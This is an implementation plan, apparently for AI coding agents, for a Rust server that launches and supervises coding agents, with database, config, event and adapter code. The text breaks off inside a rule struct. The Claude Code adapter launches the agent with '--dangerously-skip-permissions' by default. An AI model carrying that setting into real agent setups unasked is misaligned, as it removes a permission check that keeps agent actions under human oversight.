# Shepherd Core Engine — Implementation Plan (1 of 3)

> **For agentic workers:** REQUIRED: Use superpowers:subagent-driven-development (if subagents available) or superpowers:executing-plans to implement this plan. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build the Shepherd backend engine — a Rust server that manages agent processes, handles permissions via hooks, and exposes a WebSocket + REST API for the frontend.

**Architecture:** A standalone Rust binary embeds an HTTP/WebSocket server (axum), a SQLite database (rusqlite), and a PTY process manager (portable-pty). Agent adapters are TOML files loaded at startup. The YOLO rules engine evaluates permission requests against YAML rules. A CLI binary shares the core library and queries the server API.

**Tech Stack:** Rust (2021 edition), axum (web framework), tokio (async runtime), rusqlite (SQLite), portable-pty (PTY management), serde/toml/serde_yaml (serialization), clap (CLI), notify (file watcher)

**Spec:** `docs/superpowers/specs/2026-03-10-shepherd-design.md`

**Subsequent Plans:**
- Plan 2: Frontend (Tauri shell, React, Kanban, Focus view, xterm.js, Monaco)
- Plan 3: Lifecycle & Polish (name gen, logo gen, North Star, quality gates, notifications, Git PR pipeline)

---

## File Structure

```
shepherd/
├── Cargo.toml                          # Workspace root
├── crates/
│   ├── shepherd-core/                  # Core library (shared by server + CLI)
│   │   ├── Cargo.toml
│   │   └── src/
│   │       ├── lib.rs                  # Re-exports all modules
│   │       ├── db/
│   │       │   ├── mod.rs              # DB pool and migration runner
│   │       │   ├── models.rs           # Task, Session, Permission, etc.
│   │       │   └── queries.rs          # CRUD operations
│   │       ├── adapters/
│   │       │   ├── mod.rs              # Adapter registry
│   │       │   ├── protocol.rs         # AdapterConfig struct (TOML schema)
│   │       │   └── builtin/            # First-class adapter TOML files
│   │       │       └── claude-code.toml
│   │       ├── pty/
│   │       │   ├── mod.rs              # PTY manager: spawn, kill, I/O
│   │       │   └── status.rs           # Status detection from output patterns
│   │       ├── hooks/
│   │       │   ├── mod.rs              # Hook installer and state watcher
│   │       │   └── claude.rs           # Claude Code hook handler
│   │       ├── yolo/
│   │       │   ├── mod.rs              # YOLO engine: evaluate permissions
│   │       │   └── rules.rs            # Rule parser (YAML → rule list)
│   │       ├── config/
│   │       │   ├── mod.rs              # Config loader (global + project)
│   │       │   └── types.rs            # ShepherdConfig struct
│   │       └── events.rs               # Event types (WS messages)
│   │
│   ├── shepherd-server/                # HTTP/WS server binary
│   │   ├── Cargo.toml
│   │   └── src/
│   │       ├── main.rs                 # Entry point, server startup
│   │       ├── routes/
│   │       │   ├── mod.rs              # Router setup
│   │       │   ├── tasks.rs            # POST/GET/DELETE /api/tasks
│   │       │   └── health.rs           # GET /api/health
│   │       ├── ws.rs                   # WebSocket handler
│   │       └── state.rs                # AppState (shared server state)
│   │
│   └── shepherd-cli/                   # CLI binary
│       ├── Cargo.toml
│       └── src/
│           └── main.rs                 # CLI commands (status, new, approve, etc.)
│
├── adapters/                           # Default adapter TOML files
│   ├── claude-code.toml
│   ├── codex.toml
│   ├── opencode.toml
│   ├── gemini-cli.toml
│   └── aider.toml
│
├── tests/
│   └── integration/
│       ├── server_test.rs              # Server integration tests
│       └── pty_test.rs                 # PTY integration tests
│
├── docs/
│   └── superpowers/
│       ├── specs/
│       │   └── 2026-03-10-shepherd-design.md
│       └── plans/
│           └── 2026-03-10-shepherd-plan-1-core-engine.md
│
└── .gitignore
```

---

## Chunk 1: Project Scaffolding & Database

### Task 1: Initialize Rust Workspace

**Files:**
- Create: `Cargo.toml` (workspace root)
- Create: `crates/shepherd-core/Cargo.toml`
- Create: `crates/shepherd-core/src/lib.rs`
- Create: `crates/shepherd-server/Cargo.toml`
- Create: `crates/shepherd-server/src/main.rs`
- Create: `crates/shepherd-cli/Cargo.toml`
- Create: `crates/shepherd-cli/src/main.rs`

- [ ] **Step 1: Create workspace Cargo.toml**

```toml
# Cargo.toml
[workspace]
resolver = "2"
members = [
    "crates/shepherd-core",
    "crates/shepherd-server",
    "crates/shepherd-cli",
]

[workspace.package]
version = "0.1.0"
edition = "2021"
license = "MIT"

[workspace.dependencies]
shepherd-core = { path = "crates/shepherd-core" }
tokio = { version = "1", features = ["full"] }
serde = { version = "1", features = ["derive"] }
serde_json = "1"
anyhow = "1"
tracing = "0.1"
tracing-subscriber = { version = "0.3", features = ["env-filter"] }
```

- [ ] **Step 2: Create shepherd-core crate**

```toml
# crates/shepherd-core/Cargo.toml
[package]
name = "shepherd-core"
version.workspace = true
edition.workspace = true

[dependencies]
serde = { workspace = true }
serde_json = { workspace = true }
anyhow = { workspace = true }
tracing = { workspace = true }
rusqlite = { version = "0.31", features = ["bundled"] }
toml = "0.8"
serde_yaml = "0.9"
chrono = { version = "0.4", features = ["serde"] }
```

```rust
// crates/shepherd-core/src/lib.rs
pub mod config;
pub mod db;
pub mod events;
```

- [ ] **Step 3: Create shepherd-server crate**

```toml
# crates/shepherd-server/Cargo.toml
[package]
name = "shepherd-server"
version.workspace = true
edition.workspace = true

[dependencies]
shepherd-core = { workspace = true }
tokio = { workspace = true }
serde = { workspace = true }
serde_json = { workspace = true }
anyhow = { workspace = true }
tracing = { workspace = true }
tracing-subscriber = { workspace = true }
axum = { version = "0.7", features = ["ws"] }
tower-http = { version = "0.5", features = ["cors"] }
```

```rust
// crates/shepherd-server/src/main.rs
use tracing_subscriber::EnvFilter;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::from_default_env())
        .init();

    tracing::info!("Shepherd server starting...");
    Ok(())
}
```

- [ ] **Step 4: Create shepherd-cli crate**

```toml
# crates/shepherd-cli/Cargo.toml
[package]
name = "shepherd-cli"
version.workspace = true
edition.workspace = true

[[bin]]
name = "shepherd"
path = "src/main.rs"

[dependencies]
shepherd-core = { workspace = true }
anyhow = { workspace = true }
clap = { version = "4", features = ["derive"] }
reqwest = { version = "0.12", features = ["json"] }
tokio = { workspace = true }
serde_json = { workspace = true }
```

```rust
// crates/shepherd-cli/src/main.rs
use clap::{Parser, Subcommand};

#[derive(Parser)]
#[command(name = "shepherd", about = "Manage your coding agents")]
struct Cli {
    #[command(subcommand)]
    command: Option<Commands>,
}

#[derive(Subcommand)]
enum Commands {
    /// Show status of all tasks
    Status,
    /// Create a new task
    New {
        /// Task description
        prompt: String,
        /// Agent to use
        #[arg(long, default_value = "claude-code")]
        agent: String,
        /// Isolation mode
        #[arg(long, default_value = "worktree")]
        isolation: String,
    },
    /// Approve a pending permission
    Approve {
        /// Task ID (or --all)
        task_id: Option<u64>,
        #[arg(long)]
        all: bool,
    },
    /// Initialize Shepherd in current project
    Init,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let cli = Cli::parse();
    match cli.command {
        Some(Commands::Status) => {
            println!("Shepherd status: not yet implemented");
        }
        Some(Commands::New { prompt, agent, isolation }) => {
            println!("Creating task: {prompt} (agent: {agent}, isolation: {isolation})");
        }
        Some(Commands::Approve { task_id, all }) => {
            if all {
                println!("Approving all pending permissions");
            } else if let Some(id) = task_id {
                println!("Approving task #{id}");
            }
        }
        Some(Commands::Init) => {
            println!("Initializing Shepherd...");
        }
        None => {
            println!("Starting Shepherd server + GUI...");
        }
    }
    Ok(())
}
```

- [ ] **Step 5: Verify workspace builds**

Run: `cargo build`
Expected: Compiles successfully with no errors.

- [ ] **Step 6: Commit**

```bash
git add Cargo.toml crates/
git commit -m "feat: scaffold Rust workspace with core, server, and CLI crates"
```

---

### Task 2: Database Layer

**Files:**
- Create: `crates/shepherd-core/src/db/mod.rs`
- Create: `crates/shepherd-core/src/db/models.rs`
- Create: `crates/shepherd-core/src/db/queries.rs`
- Modify: `crates/shepherd-core/src/lib.rs`

- [ ] **Step 1: Write test for database initialization**

```rust
// crates/shepherd-core/src/db/mod.rs
use anyhow::Result;
use rusqlite::Connection;
use std::path::Path;

pub mod models;
pub mod queries;

pub fn open(path: &Path) -> Result<Connection> {
    let conn = Connection::open(path)?;
    conn.execute_batch("PRAGMA journal_mode=WAL; PRAGMA foreign_keys=ON;")?;
    migrate(&conn)?;
    Ok(conn)
}

pub fn open_memory() -> Result<Connection> {
    let conn = Connection::open_in_memory()?;
    conn.execute_batch("PRAGMA foreign_keys=ON;")?;
    migrate(&conn)?;
    Ok(conn)
}

fn migrate(conn: &Connection) -> Result<()> {
    conn.execute_batch(
        "
        CREATE TABLE IF NOT EXISTS tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            title TEXT NOT NULL,
            prompt TEXT NOT NULL DEFAULT '',
            agent_id TEXT NOT NULL,
            repo_path TEXT NOT NULL DEFAULT '',
            branch TEXT NOT NULL DEFAULT '',
            isolation_mode TEXT NOT NULL DEFAULT 'worktree',
            status TEXT NOT NULL DEFAULT 'queued',
            created_at TEXT NOT NULL DEFAULT (datetime('now')),
            updated_at TEXT NOT NULL DEFAULT (datetime('now'))
        );

        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            task_id INTEGER NOT NULL REFERENCES tasks(id),
            pty_pid INTEGER,
            terminal_log_path TEXT NOT NULL DEFAULT '',
            started_at TEXT NOT NULL DEFAULT (datetime('now')),
            ended_at TEXT
        );

        CREATE TABLE IF NOT EXISTS permissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            task_id INTEGER NOT NULL REFERENCES tasks(id),
            tool_name TEXT NOT NULL,
            tool_args TEXT NOT NULL DEFAULT '',
            decision TEXT NOT NULL DEFAULT 'pending',
            rule_matched TEXT,
            decided_at TEXT
        );

        CREATE TABLE IF NOT EXISTS diffs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            task_id INTEGER NOT NULL REFERENCES tasks(id),
            file_path TEXT NOT NULL,
            before_hash TEXT,
            after_hash TEXT,
            created_at TEXT NOT NULL DEFAULT (datetime('now'))
        );

        CREATE TABLE IF NOT EXISTS profiles (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL UNIQUE,
            config_json TEXT NOT NULL DEFAULT '{}',
            is_default INTEGER NOT NULL DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS gate_results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            task_id INTEGER NOT NULL REFERENCES tasks(id),
            gate_name TEXT NOT NULL,
            passed INTEGER NOT NULL,
            output TEXT NOT NULL DEFAULT '',
            ran_at TEXT NOT NULL DEFAULT (datetime('now'))
        );

        INSERT OR IGNORE INTO profiles (name, is_default) VALUES ('default', 1);
        ",
    )?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_open_memory_creates_tables() {
        let conn = open_memory().unwrap();
        let count: i64 = conn
            .query_row(
                "SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name IN ('tasks', 'sessions', 'permissions', 'diffs', 'profiles', 'gate_results')",
                [],
                |row| row.get(0),
            )
            .unwrap();
        assert_eq!(count, 6);
    }

    #[test]
    fn test_default_profile_created() {
        let conn = open_memory().unwrap();
        let name: String = conn
            .query_row(
                "SELECT name FROM profiles WHERE is_default = 1",
                [],
                |row| row.get(0),
            )
            .unwrap();
        assert_eq!(name, "default");
    }
}
```

- [ ] **Step 2: Run tests to verify they pass**

Run: `cargo test -p shepherd-core`
Expected: 2 tests pass.

- [ ] **Step 3: Write models**

```rust
// crates/shepherd-core/src/db/models.rs
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum TaskStatus {
    Queued,
    Running,
    Input,
    Review,
    Error,
    Done,
}

impl TaskStatus {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::Queued => "queued",
            Self::Running => "running",
            Self::Input => "input",
            Self::Review => "review",
            Self::Error => "error",
            Self::Done => "done",
        }
    }

    pub fn from_str(s: &str) -> Option<Self> {
        match s {
            "queued" => Some(Self::Queued),
            "running" => Some(Self::Running),
            "input" => Some(Self::Input),
            "review" => Some(Self::Review),
            "error" => Some(Self::Error),
            "done" => Some(Self::Done),
            _ => None,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Task {
    pub id: i64,
    pub title: String,
    pub prompt: String,
    pub agent_id: String,
    pub repo_path: String,
    pub branch: String,
    pub isolation_mode: String,
    pub status: TaskStatus,
    pub created_at: String,
    pub updated_at: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CreateTask {
    pub title: String,
    pub prompt: Option<String>,
    pub agent_id: String,
    pub repo_path: Option<String>,
    pub isolation_mode: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Permission {
    pub id: i64,
    pub task_id: i64,
    pub tool_name: String,
    pub tool_args: String,
    pub decision: String,
    pub rule_matched: Option<String>,
    pub decided_at: Option<String>,
}
```

- [ ] **Step 4: Write query functions with tests**

```rust
// crates/shepherd-core/src/db/queries.rs
use anyhow::Result;
use rusqlite::{params, Connection};

use super::models::{CreateTask, Task, TaskStatus};

pub fn create_task(conn: &Connection, input: &CreateTask) -> Result<Task> {
    conn.execute(
        "INSERT INTO tasks (title, prompt, agent_id, repo_path, isolation_mode) VALUES (?1, ?2, ?3, ?4, ?5)",
        params![
            input.title,
            input.prompt.as_deref().unwrap_or(""),
            input.agent_id,
            input.repo_path.as_deref().unwrap_or(""),
            input.isolation_mode.as_deref().unwrap_or("worktree"),
        ],
    )?;
    let id = conn.last_insert_rowid();
    get_task(conn, id)
}

pub fn get_task(conn: &Connection, id: i64) -> Result<Task> {
    let task = conn.query_row(
        "SELECT id, title, prompt, agent_id, repo_path, branch, isolation_mode, status, created_at, updated_at FROM tasks WHERE id = ?1",
        params![id],
        |row| {
            Ok(Task {
                id: row.get(0)?,
                title: row.get(1)?,
                prompt: row.get(2)?,
                agent_id: row.get(3)?,
                repo_path: row.get(4)?,
                branch: row.get(5)?,
                isolation_mode: row.get(6)?,
                status: TaskStatus::from_str(&row.get::<_, String>(7)?).unwrap_or(TaskStatus::Queued),
                created_at: row.get(8)?,
                updated_at: row.get(9)?,
            })
        },
    )?;
    Ok(task)
}

pub fn list_tasks(conn: &Connection) -> Result<Vec<Task>> {
    let mut stmt = conn.prepare(
        "SELECT id, title, prompt, agent_id, repo_path, branch, isolation_mode, status, created_at, updated_at FROM tasks ORDER BY id"
    )?;
    let tasks = stmt.query_map([], |row| {
        Ok(Task {
            id: row.get(0)?,
            title: row.get(1)?,
            prompt: row.get(2)?,
            agent_id: row.get(3)?,
            repo_path: row.get(4)?,
            branch: row.get(5)?,
            isolation_mode: row.get(6)?,
            status: TaskStatus::from_str(&row.get::<_, String>(7)?).unwrap_or(TaskStatus::Queued),
            created_at: row.get(8)?,
            updated_at: row.get(9)?,
        })
    })?
    .collect::<Result<Vec<_>, _>>()?;
    Ok(tasks)
}

pub fn update_task_status(conn: &Connection, id: i64, status: &TaskStatus) -> Result<()> {
    conn.execute(
        "UPDATE tasks SET status = ?1, updated_at = datetime('now') WHERE id = ?2",
        params![status.as_str(), id],
    )?;
    Ok(())
}

pub fn delete_task(conn: &Connection, id: i64) -> Result<()> {
    conn.execute("DELETE FROM tasks WHERE id = ?1", params![id])?;
    Ok(())
}

pub fn count_by_status(conn: &Connection) -> Result<Vec<(String, i64)>> {
    let mut stmt = conn.prepare("SELECT status, COUNT(*) FROM tasks GROUP BY status")?;
    let counts = stmt
        .query_map([], |row| Ok((row.get(0)?, row.get(1)?)))?
        .collect::<Result<Vec<_>, _>>()?;
    Ok(counts)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::db::open_memory;

    #[test]
    fn test_create_and_get_task() {
        let conn = open_memory().unwrap();
        let task = create_task(
            &conn,
            &CreateTask {
                title: "Refactor DB".into(),
                prompt: Some("Refactor the database layer".into()),
                agent_id: "claude-code".into(),
                repo_path: Some("/tmp/test".into()),
                isolation_mode: None,
            },
        )
        .unwrap();

        assert_eq!(task.title, "Refactor DB");
        assert_eq!(task.agent_id, "claude-code");
        assert_eq!(task.status, TaskStatus::Queued);
        assert_eq!(task.isolation_mode, "worktree");
    }

    #[test]
    fn test_list_tasks() {
        let conn = open_memory().unwrap();
        create_task(&conn, &CreateTask {
            title: "Task 1".into(),
            prompt: None,
            agent_id: "claude-code".into(),
            repo_path: None,
            isolation_mode: None,
        }).unwrap();
        create_task(&conn, &CreateTask {
            title: "Task 2".into(),
            prompt: None,
            agent_id: "codex".into(),
            repo_path: None,
            isolation_mode: None,
        }).unwrap();

        let tasks = list_tasks(&conn).unwrap();
        assert_eq!(tasks.len(), 2);
    }

    #[test]
    fn test_update_status() {
        let conn = open_memory().unwrap();
        let task = create_task(&conn, &CreateTask {
            title: "Test".into(),
            prompt: None,
            agent_id: "claude-code".into(),
            repo_path: None,
            isolation_mode: None,
        }).unwrap();

        update_task_status(&conn, task.id, &TaskStatus::Running).unwrap();
        let updated = get_task(&conn, task.id).unwrap();
        assert_eq!(updated.status, TaskStatus::Running);
    }

    #[test]
    fn test_count_by_status() {
        let conn = open_memory().unwrap();
        create_task(&conn, &CreateTask {
            title: "T1".into(), prompt: None, agent_id: "a".into(), repo_path: None, isolation_mode: None,
        }).unwrap();
        create_task(&conn, &CreateTask {
            title: "T2".into(), prompt: None, agent_id: "a".into(), repo_path: None, isolation_mode: None,
        }).unwrap();

        let counts = count_by_status(&conn).unwrap();
        assert_eq!(counts.len(), 1);
        assert_eq!(counts[0], ("queued".to_string(), 2));
    }
}
```

- [ ] **Step 5: Run all tests**

Run: `cargo test -p shepherd-core`
Expected: All 6 tests pass.

- [ ] **Step 6: Commit**

```bash
git add crates/shepherd-core/src/db/
git commit -m "feat: add SQLite database layer with task CRUD and migrations"
```

---

### Task 3: Configuration System

**Files:**
- Create: `crates/shepherd-core/src/config/mod.rs`
- Create: `crates/shepherd-core/src/config/types.rs`
- Modify: `crates/shepherd-core/src/lib.rs`

- [ ] **Step 1: Write config types**

```rust
// crates/shepherd-core/src/config/types.rs
use serde::{Deserialize, Serialize};
use std::path::PathBuf;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShepherdConfig {
    #[serde(default = "default_port")]
    pub port: u16,
    #[serde(default = "default_max_agents")]
    pub max_agents: usize,
    #[serde(default = "default_permission_mode")]
    pub default_permission_mode: String,
    #[serde(default = "default_isolation")]
    pub default_isolation: String,
    #[serde(default = "default_agent")]
    pub default_agent: String,
    #[serde(default)]
    pub sound_enabled: bool,
}

fn default_port() -> u16 { 7532 }
fn default_max_agents() -> usize { 10 }
fn default_permission_mode() -> String { "ask".into() }
fn default_isolation() -> String { "worktree".into() }
fn default_agent() -> String { "claude-code".into() }

impl Default for ShepherdConfig {
    fn default() -> Self {
        Self {
            port: default_port(),
            max_agents: default_max_agents(),
            default_permission_mode: default_permission_mode(),
            default_isolation: default_isolation(),
            default_agent: default_agent(),
            sound_enabled: false,
        }
    }
}
```

- [ ] **Step 2: Write config loader with tests**

```rust
// crates/shepherd-core/src/config/mod.rs
pub mod types;

use anyhow::Result;
use std::path::{Path, PathBuf};
use types::ShepherdConfig;

pub fn shepherd_dir() -> PathBuf {
    dirs::home_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join(".shepherd")
}

pub fn load_config(project_dir: Option<&Path>) -> Result<ShepherdConfig> {
    let global_path = shepherd_dir().join("config.toml");
    let mut config = if global_path.exists() {
        let content = std::fs::read_to_string(&global_path)?;
        toml::from_str(&content)?
    } else {
        ShepherdConfig::default()
    };

    // Project-level overrides
    if let Some(dir) = project_dir {
        let project_path = dir.join(".shepherd").join("config.toml");
        if project_path.exists() {
            let content = std::fs::read_to_string(&project_path)?;
            let project: ShepherdConfig = toml::from_str(&content)?;
            // Project overrides take precedence
            config.default_agent = project.default_agent;
            config.default_isolation = project.default_isolation;
            config.default_permission_mode = project.default_permission_mode;
        }
    }

    Ok(config)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_default_config() {
        let config = ShepherdConfig::default();
        assert_eq!(config.port, 7532);
        assert_eq!(config.max_agents, 10);
        assert_eq!(config.default_permission_mode, "ask");
    }

    #[test]
    fn test_load_missing_config_returns_defaults() {
        let config = load_config(None).unwrap();
        assert_eq!(config.port, 7532);
    }

    #[test]
    fn test_config_roundtrip() {
        let config = ShepherdConfig::default();
        let toml_str = toml::to_string_pretty(&config).unwrap();
        let parsed: ShepherdConfig = toml::from_str(&toml_str).unwrap();
        assert_eq!(parsed.port, config.port);
        assert_eq!(parsed.max_agents, config.max_agents);
    }
}
```

- [ ] **Step 3: Add `dirs` dependency to Cargo.toml**

Add `dirs = "5"` to `[dependencies]` in `crates/shepherd-core/Cargo.toml`.

- [ ] **Step 4: Run tests**

Run: `cargo test -p shepherd-core`
Expected: All 9 tests pass.

- [ ] **Step 5: Commit**

```bash
git add crates/shepherd-core/
git commit -m "feat: add config system with global + project-level TOML loading"
```

---

### Task 4: Event Types (WebSocket Protocol)

**Files:**
- Create: `crates/shepherd-core/src/events.rs`

- [ ] **Step 1: Define event types**

```rust
// crates/shepherd-core/src/events.rs
use serde::{Deserialize, Serialize};

/// Events sent from server to client
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", content = "data")]
#[serde(rename_all = "snake_case")]
pub enum ServerEvent {
    TaskCreated(TaskEvent),
    TaskUpdated(TaskEvent),
    TaskDeleted { id: i64 },
    TerminalOutput { task_id: i64, data: String },
    PermissionRequested(PermissionEvent),
    PermissionResolved(PermissionEvent),
    GateResult { task_id: i64, gate: String, passed: bool },
    Notification { title: String, body: String },
    StatusSnapshot(StatusSnapshot),
}

/// Events sent from client to server
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", content = "data")]
#[serde(rename_all = "snake_case")]
pub enum ClientEvent {
    TaskCreate {
        title: String,
        agent_id: String,
        repo_path: Option<String>,
        isolation_mode: Option<String>,
        prompt: Option<String>,
    },
    TaskApprove { task_id: i64 },
    TaskApproveAll,
    TaskCancel { task_id: i64 },
    TerminalInput { task_id: i64, data: String },
    TerminalResize { task_id: i64, cols: u16, rows: u16 },
    Subscribe,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskEvent {
    pub id: i64,
    pub title: String,
    pub agent_id: String,
    pub status: String,
    pub branch: String,
    pub repo_path: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PermissionEvent {
    pub id: i64,
    pub task_id: i64,
    pub tool_name: String,
    pub tool_args: String,
    pub decision: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StatusSnapshot {
    pub tasks: Vec<TaskEvent>,
    pub pending_permissions: Vec<PermissionEvent>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_server_event_serialization() {
        let event = ServerEvent::TaskCreated(TaskEvent {
            id: 1,
            title: "Test".into(),
            agent_id: "claude-code".into(),
            status: "queued".into(),
            branch: "feat/test".into(),
            repo_path: "/tmp".into(),
        });
        let json = serde_json::to_string(&event).unwrap();
        assert!(json.contains("task_created"));
        let parsed: ServerEvent = serde_json::from_str(&json).unwrap();
        match parsed {
            ServerEvent::TaskCreated(t) => assert_eq!(t.id, 1),
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn test_client_event_deserialization() {
        let json = r#"{"type":"task_approve","data":{"task_id":42}}"#;
        let event: ClientEvent = serde_json::from_str(json).unwrap();
        match event {
            ClientEvent::TaskApprove { task_id } => assert_eq!(task_id, 42),
            _ => panic!("wrong variant"),
        }
    }
}
```

- [ ] **Step 2: Run tests**

Run: `cargo test -p shepherd-core`
Expected: All 11 tests pass.

- [ ] **Step 3: Commit**

```bash
git add crates/shepherd-core/src/events.rs
git commit -m "feat: define WebSocket event protocol types"
```

---

## Chunk 2: Agent Adapters & YOLO Engine

### Task 5: Agent Adapter Protocol

**Files:**
- Create: `crates/shepherd-core/src/adapters/mod.rs`
- Create: `crates/shepherd-core/src/adapters/protocol.rs`
- Create: `adapters/claude-code.toml`
- Create: `adapters/codex.toml`
- Modify: `crates/shepherd-core/src/lib.rs`

- [ ] **Step 1: Write adapter protocol types**

```rust
// crates/shepherd-core/src/adapters/protocol.rs
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdapterConfig {
    pub agent: AgentSection,
    #[serde(default)]
    pub hooks: Option<HooksSection>,
    pub status: StatusSection,
    pub permissions: PermissionsSection,
    #[serde(default)]
    pub capabilities: CapabilitiesSection,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentSection {
    pub name: String,
    pub command: String,
    #[serde(default)]
    pub args: Vec<String>,
    #[serde(default)]
    pub args_interactive: Vec<String>,
    #[serde(default)]
    pub version_check: Option<String>,
    #[serde(default)]
    pub icon: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HooksSection {
    #[serde(rename = "type")]
    pub hook_type: String,
    #[serde(default = "default_install")]
    pub install: String,
    #[serde(default)]
    pub state_dir: Option<String>,
}

fn default_install() -> String { "auto".into() }

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StatusSection {
    #[serde(default)]
    pub working_patterns: Vec<String>,
    #[serde(default)]
    pub idle_patterns: Vec<String>,
    #[serde(default)]
    pub input_patterns: Vec<String>,
    #[serde(default)]
    pub error_patterns: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PermissionsSection {
    #[serde(default = "default_approve")]
    pub approve: String,
    #[serde(default = "default_approve_all")]
    pub approve_all: String,
    #[serde(default = "default_deny")]
    pub deny: String,
}

fn default_approve() -> String { "y\n".into() }
fn default_approve_all() -> String { "Y\n".into() }
fn default_deny() -> String { "n\n".into() }

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct CapabilitiesSection {
    #[serde(default)]
    pub supports_hooks: bool,
    #[serde(default)]
    pub supports_prompt_arg: bool,
    #[serde(default)]
    pub supports_resume: bool,
    #[serde(default)]
    pub supports_mcp: bool,
    #[serde(default)]
    pub supports_worktree: bool,
}
```

- [ ] **Step 2: Write adapter registry with test**

```rust
// crates/shepherd-core/src/adapters/mod.rs
pub mod protocol;

use anyhow::{Context, Result};
use protocol::AdapterConfig;
use std::collections::HashMap;
use std::path::Path;

pub struct AdapterRegistry {
    adapters: HashMap<String, AdapterConfig>,
}

impl AdapterRegistry {
    pub fn new() -> Self {
        Self { adapters: HashMap::new() }
    }

    pub fn load_dir(&mut self, dir: &Path) -> Result<()> {
        if !dir.exists() {
            return Ok(());
        }
        for entry in std::fs::read_dir(dir)? {
            let entry = entry?;
            let path = entry.path();
            if path.extension().map_or(false, |e| e == "toml") {
                let content = std::fs::read_to_string(&path)
                    .with_context(|| format!("reading adapter {}", path.display()))?;
                let config: AdapterConfig = toml::from_str(&content)
                    .with_context(|| format!("parsing adapter {}", path.display()))?;
                let key = path.file_stem().unwrap().to_string_lossy().to_string();
                tracing::info!("Loaded adapter: {} ({})", config.agent.name, key);
                self.adapters.insert(key, config);
            }
        }
        Ok(())
    }

    pub fn get(&self, id: &str) -> Option<&AdapterConfig> {
        self.adapters.get(id)
    }

    pub fn list(&self) -> Vec<(&str, &AdapterConfig)> {
        self.adapters.iter().map(|(k, v)| (k.as_str(), v)).collect()
    }

    pub fn len(&self) -> usize {
        self.adapters.len()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    #[test]
    fn test_load_adapter_from_dir() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("test-agent.toml"),
            r#"
[agent]
name = "Test Agent"
command = "test-cli"

[status]
working_patterns = ["Working"]
idle_patterns = ["$"]
input_patterns = ["?"]
error_patterns = ["Error"]

[permissions]
approve = "y\n"
approve_all = "Y\n"
deny = "n\n"
"#,
        )
        .unwrap();

        let mut registry = AdapterRegistry::new();
        registry.load_dir(dir.path()).unwrap();
        assert_eq!(registry.len(), 1);
        let adapter = registry.get("test-agent").unwrap();
        assert_eq!(adapter.agent.name, "Test Agent");
        assert_eq!(adapter.agent.command, "test-cli");
    }
}
```

- [ ] **Step 3: Create the Claude Code adapter TOML**

```toml
# adapters/claude-code.toml
[agent]
name = "Claude Code"
command = "claude"
args = ["--dangerously-skip-permissions"]
args_interactive = []
version_check = "claude --version"
icon = "claude"

[hooks]
type = "claude-code"
install = "auto"

[status]
working_patterns = ["Reading ", "Writing ", "Editing ", "Searching ", "Creating ", "Running ", "Analyzing "]
idle_patterns = ["╰─", "$ "]
input_patterns = ["[y/n", "Permission", "? "]
error_patterns = ["Error:", "FAILED", "panic"]

[permissions]
approve = "y\n"
approve_all = "Y\n"
deny = "n\n"

[capabilities]
supports_hooks = true
supports_prompt_arg = true
supports_resume = true
supports_mcp = true
supports_worktree = true
```

- [ ] **Step 4: Create remaining adapter TOMLs**

Create `adapters/codex.toml`, `adapters/opencode.toml`, `adapters/gemini-cli.toml`, `adapters/aider.toml` following the same structure but with agent-specific commands and patterns.

- [ ] **Step 5: Add `tempfile` dev dependency and run tests**

Add `tempfile = "3"` to `[dev-dependencies]` in `crates/shepherd-core/Cargo.toml`.

Run: `cargo test -p shepherd-core`
Expected: All 12 tests pass.

- [ ] **Step 6: Commit**

```bash
git add crates/shepherd-core/src/adapters/ adapters/
git commit -m "feat: add agent adapter protocol with TOML spec and registry"
```

---

### Task 6: YOLO Rules Engine

**Files:**
- Create: `crates/shepherd-core/src/yolo/mod.rs`
- Create: `crates/shepherd-core/src/yolo/rules.rs`
- Modify: `crates/shepherd-core/src/lib.rs`

- [ ] **Step 1: Write rule types**

```rust
// crates/shepherd-core/src/yolo/rules.rs
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RuleSet {
    #[serde(default)]
    pub deny: Vec<Rule>,
    #[serde(default)]
    pub allow: Vec<Rule>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Rule {
    #[serde(default)]
    pub tool: Option<String>,
